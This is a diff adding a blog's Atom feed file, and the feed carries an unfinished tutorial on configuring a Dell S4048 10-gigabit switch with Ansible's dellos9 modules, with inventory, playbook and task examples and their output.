@@ -1,0 +1,2007 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.1.1">Jekyll</generator><link href="https://gainanov.pro/eng-blog/feed.xml" rel="self" type="application/atom+xml" /><link href="https://gainanov.pro/eng-blog/" rel="alternate" type="text/html" /><updated>2020-10-05T12:58:47+03:00</updated><id>https://gainanov.pro/eng-blog/feed.xml</id><title type="html">GAINANOV.PRO</title><subtitle>Hi! I'm Ruslan. I'm interested in the development of software and administration of systems. This is another personal blog about IT, servers and software. I've made the site for writing my notes about everything I have ever done. I hope it is helpful to someone.</subtitle><author><name>Ruslan Gainanov</name><email>gromrx1@gmail.com</email><uri>http://gainanov.pro</uri></author><entry><title type="html">DELL. Configure Dell 10 gigabit switch with Ansible</title><link href="https://gainanov.pro/eng-blog/devops/dell-ansible-playbook/" rel="alternate" type="text/html" title="DELL. Configure Dell 10 gigabit switch with Ansible" /><published>2020-08-01T00:00:00+03:00</published><updated>2020-08-01T00:00:00+03:00</updated><id>https://gainanov.pro/eng-blog/devops/dell-ansible-playbook</id><content type="html" xml:base="https://gainanov.pro/eng-blog/devops/dell-ansible-playbook/">&lt;p&gt;Today I would like to talk how to easy configure a network switch with Ansible.
+In the past when no one listens about “Infrastructure as a Code” (IaaC) methodology we setuping our devices throw console.
+We type command by command successively. We copy configure scripts and edit them on device. It’s good, but when you configure many devices you often will mistakes.&lt;/p&gt;
+
+&lt;p&gt;Today with a very beautiful utility as Ansible. We could automate many actions, that we make manually earlier.
+Futhermore we can configure a network switches like Dell and Cisco too. Ansible has a specific modules for these things.&lt;/p&gt;
+
+&lt;p&gt;If you already familiar with Ansible you will see how it come easy.
+Soo in this post I want to share my experience about it. It will include many practical examples.
+All code sketches has been tested by me on &lt;a href=&quot;https://i.dell.com/sites/doccontent/shared-content/data-sheets/en/Documents/Dell-EMC-Networking-S4048-ON-Spec-Sheet.pdf&quot;&gt;Dell S4048&lt;/a&gt; 10-gigabit switch.&lt;/p&gt;
+
+&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h2&gt;
+
+&lt;p&gt;These examples requires the following:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Ansible 2.5 (or higher) installed. See Installing Ansible for more information.&lt;/li&gt;
+  &lt;li&gt;Dell OS9 platform device.&lt;/li&gt;
+  &lt;li&gt;Basic understanding of YAML Syntax.&lt;/li&gt;
+  &lt;li&gt;Basic Linux command line use.&lt;/li&gt;
+  &lt;li&gt;Basic knowledge of network switch &amp;amp; router configurations.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;You should have enabled SSH-server. See my &lt;a href=&quot;/eng-blog/sysad/dell-ssh-server-configure/&quot;&gt;previous post&lt;/a&gt; about configuring it.
+It is not difficult.
+Also you should append the connection rate by SSH on the network device.
+Use the command below to configure the maximum number of incoming SSH connections per minute.&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ip ssh connection-rate-limit 60
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;tested-environment&quot;&gt;Tested Environment&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Dell Switch S4048 (OS9 Network System v.9.14)&lt;/li&gt;
+  &lt;li&gt;Ansible 2.9.11 with Python 3.8 runs on MacOS&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;inventory&quot;&gt;Inventory&lt;/h2&gt;
+
+&lt;p&gt;All Ansible tasks started with adding a new host into &lt;a href=&quot;https://gainanov.pro/eng-blog/devops/ansible-architecture/#1-inventory&quot;&gt;Inventory file&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;I prefer to use inventory stored in YAML format. This is mine (stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hosts&lt;/code&gt; file):&lt;/p&gt;
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nn&quot;&gt;...&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;switch10g_new&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;ansible_host&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;192.168.1.10&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;ansible_user&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;admin&lt;/span&gt;
+      &lt;span class=&quot;na&quot;&gt;ansible_network_os&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dellos9&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This piece has told Ansible that the host named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;switch10g_new&lt;/code&gt; should be accessible by selected IP and user name.&lt;/p&gt;
+
+&lt;p&gt;Before continue writing a playbook try to connect with your credentials to the device.
+You should connecting throw ssh with command (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh admin@192.168.1.10&lt;/code&gt;) from your local device without any problem.&lt;/p&gt;
+
+&lt;h2 id=&quot;playbook&quot;&gt;Playbook&lt;/h2&gt;
+
+&lt;p&gt;My playbook (saved on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dell-switch-playbook.yml&lt;/code&gt; file) consists of the next rows:&lt;/p&gt;
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;hosts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;switch10g_new&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;gather_facts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;no&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;local&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;roles&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dell&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I have just run a role named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dell&lt;/code&gt;. But in the real life do not use this name for the role.&lt;/p&gt;
+
+&lt;p&gt;The role &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dell&lt;/code&gt; include many tasks.&lt;/p&gt;
+
+&lt;h2 id=&quot;tasks&quot;&gt;Tasks&lt;/h2&gt;
+
+&lt;p&gt;Let’s run some simple tasks. Open Ansible documentation and found a part about network modules.&lt;/p&gt;
+
+&lt;p&gt;Modules for &lt;a href=&quot;https://docs.ansible.com/ansible/latest/modules/list_of_network_modules.html#dellos9&quot;&gt;Dell OS9 series&lt;/a&gt; devices includes these three modules:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dellos9_command&lt;/code&gt; – Run commands on remote devices running Dell OS9&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dellos9_config&lt;/code&gt; – Manage Dell EMC Networking OS9 configuration sections&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dellos9_facts&lt;/code&gt; – Collect facts from remote devices running Dell EMC Networking OS9&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Try to use them and see that we can make with. I will start from the end of the list.&lt;/p&gt;
+
+&lt;h3 id=&quot;dellos9_facts&quot;&gt;dellos9_facts&lt;/h3&gt;
+
+&lt;p&gt;This &lt;a href=&quot;https://docs.ansible.com/ansible/latest/modules/dellos9_facts_module.html#dellos9-facts-module&quot;&gt;module&lt;/a&gt; collect a base set of device facts from a remote device. All fact keys prepends with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ansible_net_&amp;lt;fact&amp;gt;&lt;/code&gt;.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Task to see on your local console the facts of remote device&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Collect all facts from the device&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;dellos9_facts&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# all, hardware, config, and interfaces&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# '!' to specify that a specific subset should not be collected.&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# gather_subset: [&quot;all&quot;]&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;# gather_subset: [&quot;config&quot;, &quot;hardware&quot;]&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;gather_subset&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pi&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;all&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;!interfaces&quot;&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;]&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dellos9_facts&lt;/span&gt;
+
+&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Show dellos9_facts&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;dellos9_facts&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The result of the command will presented below:
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ok: [switch10g_new] =&amp;gt; {
+&quot;dellos9_facts&quot;: {
+    &quot;ansible_facts&quot;: {
+        &quot;ansible_net_config&quot;: &quot;Current Configuration ...&quot;,
+        &quot;ansible_net_filesystems&quot;: [
+            &quot;flash&quot;,
+            &quot;fcmfs&quot;,
+            &quot;nfsmount&quot;,
+            &quot;ftp&quot;,
+            &quot;tftp&quot;,
+            &quot;scp&quot;,
+            &quot;http&quot;,
+            &quot;https&quot;
+        ],
+        &quot;ansible_net_gather_subset&quot;: [
+            &quot;hardware&quot;,
+            &quot;default&quot;,
+            &quot;config&quot;
+        ],
+        &quot;ansible_net_hostname&quot;: &quot;DellEMC&quot;,
+        &quot;ansible_net_image&quot;: &quot;system://A&quot;,
+        &quot;ansible_net_memfree_mb&quot;: 3123970,
+        &quot;ansible_net_memtotal_mb&quot;: 3126272,
+        &quot;ansible_net_model&quot;: &quot;S4048-ON &quot;,
+        &quot;ansible_net_serialnum&quot;: &quot;NA&quot;,
+        &quot;ansible_net_version&quot;: &quot;9.14(2.7)&quot;
+    },
+    &quot;changed&quot;: false,
+    &quot;failed&quot;: false
+}
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Task related with previous to save a switch configuration to your local directory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;files/&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Save an active config from the device to localhost&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;vars&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;running_config&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dellos9_facts['ansible_facts']['ansible_net_config']&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;local_action&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;module&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;copy&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;running_config&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;dest&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;files/running_config_{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;inventory_hostname&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;dellos9_command&quot;&gt;dellos9_command&lt;/h3&gt;
+
+&lt;p&gt;The module &lt;a href=&quot;https://docs.ansible.com/ansible/latest/modules/dellos9_command_module.html#dellos9-command-module&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dellos9_command&lt;/code&gt;&lt;/a&gt; sends commands to the host and returns the results read from the device.
+You should know that this module does not support running commands in CONF mode.&lt;/p&gt;
+
+&lt;p&gt;It useful to show something about your device.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Task for getting a device version&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Detect a device version&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;dellos9_command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;commands&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;show version&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;show_ver&lt;/span&gt;
+
+&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;show version command output&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;var&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;show_ver.stdout_lines&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The result will be like:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TASK [dell : show version command output]***************************************
+ok: [switch10g_new] =&amp;gt; {
+    &quot;show_ver.stdout_lines&quot;: [
+        [
+            &quot;Dell EMC Real Time Operating System Software&quot;,
+            &quot;Dell EMC Operating System Version:  2.0&quot;,
+            &quot;Dell EMC Application Software Version:  9.14(2.7)&quot;,
+            &quot;Dell EMC Networking OS uptime is 56 minute(s)&quot;,
+            &quot;&quot;,
+            &quot;System Type: S4048-ON &quot;,
+            &quot;&quot;,
+            &quot;8G bytes of boot flash memory.&quot;,
+            &quot;&quot;,
+            &quot;  1 54-port TE/FG (SK-ON)&quot;,
+            &quot; 48 Ten GigabitEthernet/IEEE 802.3 interface(s)&quot;,
+            &quot;  6 Forty GigabitEthernet/IEEE 802.3 interface(s)&quot;
+        ]
+    ]
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Or task to see a device time&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Get device clock&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;dellos9_command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;commands&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;show clock&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;show_clock&lt;/span&gt;
+&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;var=show_clock.stdout&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we ready using a module that will change a state, that will edit a configuration of the device&lt;/p&gt;
+
+&lt;h3 id=&quot;dellos9_config&quot;&gt;dellos9_config&lt;/h3&gt;
+
+&lt;p&gt;The module &lt;a href=&quot;https://docs.ansible.com/ansible/latest/modules/dellos9_config_module.html#dellos9-config-module&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dellos9_config&lt;/code&gt;&lt;/a&gt; writes a blocks of code into your device configuration. It has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;before&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;after&lt;/code&gt; parameters to exactly point the place where your code should saved.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Task for changing an interface configuration&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Enable&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dhcp&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;client&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;on&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;te1/1&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;dellos9_config&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;dhcp'&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;no&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;shutdown'&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;parents&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;TenGigabitEthernet&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;1/1'&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;register&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;enable_interface&lt;/span&gt;
+&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;var=enable_interface&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;The result of the task:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TASK [dell : Enable interface and dhcp client on port te1/1] *******************
+changed: [switch10g_new]
+
+TASK [dell : debug] ************************************************************
+ok: [switch10g_new] =&amp;gt; {
+    &quot;enable_interface&quot;: {
+        &quot;changed&quot;: true,
+        &quot;commands&quot;: [
+            &quot;interface TenGigabitEthernet 1/1&quot;,
+            &quot;ip address dhcp&quot;,
+            &quot;no shutdown&quot;
+        ],
+        &quot;failed&quot;: false,
+        &quot;saved&quot;: false,
+        &quot;updates&quot;: [
+            &quot;interface TenGigabitEthernet 1/1&quot;,
+            &quot;ip address dhcp&quot;,
+            &quot;no shutdown&quot;
+        ]
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Also it useful to run some actions that acquire to input answer to a prompt.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Task for saving running_config to startup_config&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-yaml highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Copy&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;running-config&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;to&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;startup-config&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;the&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Dell&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;EMC&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;OS9&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Device&quot;&lt;/span&gt;
+  &lt;span class=&quot;na&quot;&gt;dellos9_config&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;na&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
+      &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;do copy running-config startup-config&lt;/span&gt;
+        &lt;span class=&quot;na&quot;&gt;prompt&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;\[confirm&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;yes/no\]:\s?$'&lt;/span&gt;
